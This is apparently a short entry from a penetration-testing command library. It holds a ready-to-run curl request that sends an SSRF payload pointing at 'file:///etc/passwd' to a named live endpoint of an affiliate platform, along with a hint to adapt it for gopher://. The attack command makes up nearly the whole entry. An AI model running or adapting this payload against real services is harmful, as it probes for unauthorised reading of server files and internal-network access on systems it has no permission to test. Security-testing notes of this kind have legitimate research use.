---
id: cmd-exness-post-file
data: >-
  curl -X POST
  https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H
  "Content-Type: application/json" -d '{"data":{"url":"file:///etc/passwd"}}'
tags:
  - ssrf
  - protocol
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.622Z'
verified: false
validated: true
submitted: true
---
# post-probe-file-protocol

## Command

```bash
curl -X POST https://my.exnessaffiliates.com/api/partner_integrations/template/probe -H "Content-Type: application/json" -d '{"data":{"url":"file:///etc/passwd"}}'
```

## Description

Tests file:// protocol for local file access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Payload with file URL | Yes |

## Examples

### Basic Usage

As above; adapt for gopher:// etc.

## Expected Output

WAF block or error.

## Related

- [[procedures/Test-Dangerous-Protocols-and-Further-Enumerations]]
